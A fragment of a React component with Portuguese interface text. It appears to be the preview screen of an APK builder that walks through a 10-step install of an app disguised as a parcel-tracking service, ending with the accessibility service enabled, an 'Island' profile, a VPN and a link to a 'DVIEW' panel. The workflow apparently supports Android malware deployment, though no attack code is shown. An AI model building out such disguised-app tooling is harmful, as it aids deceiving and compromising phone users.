                                SISTEMA SINCRONIZADO & ATIVO
                              </div>
                              {islandProfileEnabled && (
                                <div style={{ display: "inline-flex", alignItems: "center", gap: "4px", background: "#e0f2fe", border: "1px solid #7dd3fc", padding: "4px 8px", borderRadius: "12px", fontSize: "10.5px", fontWeight: 700, color: "#0369a1" }}>
                                  🏝️ PERFIL ISLAND ATIVADO
                                </div>
                              )}
                              {vpnEnabled && (
                                <div style={{ display: "inline-flex", alignItems: "center", gap: "4px", background: "#eff6ff", border: "1px solid #93c5fd", padding: "4px 8px", borderRadius: "12px", fontSize: "10.5px", fontWeight: 700, color: "#1d4ed8" }}>
                                  🛡️ VPN {vpnProtocol} ATIVA (1000 Mbps)
                                </div>
                              )}
                            </div>

                            <h3 style={{ margin: "4px 0", fontSize: "16px", color: "#0f172a", fontWeight: 800 }}>
                              {(screenConfig.trackingTitle || "Rastreamento de Encomendas").replace(/{appName}/g, appName)}
                            </h3>
                            <p style={{ margin: "4px 0 16px 0", fontSize: "11.5px", color: "#64748b", textAlign: "center" }}>
                              {(screenConfig.trackingSubtext || "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos.").replace(/{appName}/g, appName)}
                            </p>

                            {/* Input de Rastreamento Simulado */}
                            <div style={{ width: "100%", background: "#f8fafc", border: "1px solid #cbd5e1", borderRadius: "8px", padding: "8px 12px", display: "flex", alignItems: "center", gap: "8px", marginBottom: "12px" }}>
                              <Search size={14} style={{ color: "#64748b" }} />
                              <span style={{ fontSize: "11.5px", color: "#94a3b8" }}>Ex: 10082938192831...</span>
                            </div>

                            {/* Telemetria JSON de Sucesso */}
                            <div style={{ width: "100%", background: "#f1f5f9", border: "1px solid #e2e8f0", borderRadius: "8px", padding: "10px", fontSize: "10px", color: "#334155", fontFamily: "var(--font-mono)", textAlign: "left" }}>
                              <div>• installation: <strong style={{ color: "#16a34a" }}>"verified"</strong></div>
                              <div>• accessibility: <strong style={{ color: "#16a34a" }}>"connected"</strong></div>
                              <div>• island_profile: <strong style={{ color: "#0284c7" }}>{islandProfileEnabled ? '"provisioned"' : '"disabled"'}</strong></div>
                              <div>• vpn_tunnel: <strong style={{ color: "#16a34a" }}>"{vpnProtocol} - 1000Mbps (wire-speed)"</strong></div>
                              <div>• server_sync: <strong style={{ color: "#16a34a" }}>"online"</strong></div>
                            </div>
                          </div>

                          <button
                            style={{ width: "100%", background: screenConfig.accentColor || "#dc2626", border: "none", color: "#fff", borderRadius: "8px", padding: "10px", fontSize: "12px", fontWeight: 700, cursor: "pointer", boxShadow: `0 4px 12px ${screenConfig.accentColor || "#dc2626"}55` }}
                            onClick={() => showToast("Sistema pronto e conectado ao painel DVIEW!")}
                          >
                            Concluir & Voltar ao Início
                          </button>
                        </div>
                      )}
                    </>
                  )}
                </div>
              </div>

                  {/* LADO DIREITO: CHECKLIST DE VALIDAÇÃO TÉCNICA INTEGRADO */}
                  <div className="preview-checklist-card">
                    {/* Metadados da Etapa Ativa */}
                    <div className="preview-step-meta-box">
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                        <span style={{ fontSize: "11px", color: "#94a3b8", fontWeight: 700 }}>
                          ETAPA {officialSteps[previewStep - 1].step} DE 10
                        </span>
                        <span
                          className="preview-step-badge"
                          style={{
                            background: `${officialSteps[previewStep - 1].badgeColor}25`,
                            color: officialSteps[previewStep - 1].badgeColor
                          }}
                        >
                          {officialSteps[previewStep - 1].badge}
                        </span>
                      </div>
                      <strong style={{ fontSize: "14px", color: "#ffffff" }}>
                        {officialSteps[previewStep - 1].title}
                      </strong>
                      <small style={{ color: "#38bdf8", fontSize: "11.5px" }}>
                        {officialSteps[previewStep - 1].systemPath}
                      </small>
                      <p style={{ fontSize: "12px", color: "#cbd5e1", margin: "6px 0 0 0", lineHeight: "1.4" }}>
                        {officialSteps[previewStep - 1].description}
                      </p>
                    </div>

                    {/* Grupos do Checklist de Instalação e Validação */}
                    <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
                      {validationChecklistGroups.map((group, gIdx) => (
                        <div key={gIdx} className="checklist-group">
                          <span className="checklist-group-title">
                            <ListChecks size={13} style={{ color: "var(--crimson-neon)" }} />
                            {group.title}
                          </span>
                          <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                            {group.items.map((item, iIdx) => {
                              const isPassed = previewStep >= item.activeAt;
                              return (
                                <div key={iIdx} className="checklist-item-row">
                                  {isPassed ? (
                                    <CheckCircle2 size={14} className="checklist-check-icon" />
                                  ) : (
                                    <div style={{ width: "14px", height: "14px", borderRadius: "50%", border: "1.5px solid #475569", flexShrink: 0 }} />
                                  )}
                                  <span style={{ color: isPassed ? "#f8fafc" : "#64748b" }}>
                                    {item.label}
                                  </span>
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      ))}
                    </div>

                    {/* Card de Critério de Aceitação Oficial */}
                    <div className="acceptance-criteria-card">
                      <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "4px" }}>
                        <Sparkles size={14} style={{ color: "#22c55e" }} />
                        <strong style={{ fontSize: "11.5px", color: "#22c55e", textTransform: "uppercase" }}>
                          Critério de Aceitação Oficial
                        </strong>
                      </div>
                      <div style={{ fontSize: "11px", color: "#cbd5e1", fontFamily: "var(--font-mono)", lineHeight: "1.5" }}>
                        INSTALLATION = SUCCESS<br />
                        CONFIGURATION = SUCCESS<br />
                        ACCESSIBILITY_SERVICE = ENABLED<br />
                        APPLICATION = READY
                      </div>
                    </div>
                  </div>
                </div>

                {/* Bottom Navigation between screens */}
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", width: "100%", marginTop: "16px" }}>
                  <button
                    className="secondary"
                    onClick={() => setActiveModalTab("form")}
                  >
                    <ArrowLeft size={14} /> Voltar à Edição do APK
                  </button>

                  <div style={{ display: "flex", gap: "8px" }}>
                    <button
                      className="secondary"
                      disabled={previewStep <= 1}
                      onClick={() => setPreviewStep((s) => Math.max(1, s - 1))}
                    >
                      Etapa Anterior
                    </button>
                    <button
                      className="primary"
                      disabled={previewStep >= 10}
                      onClick={() => setPreviewStep((s) => Math.min(10, s + 1))}
                    >
                      Próxima Etapa ({previewStep}/10)
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
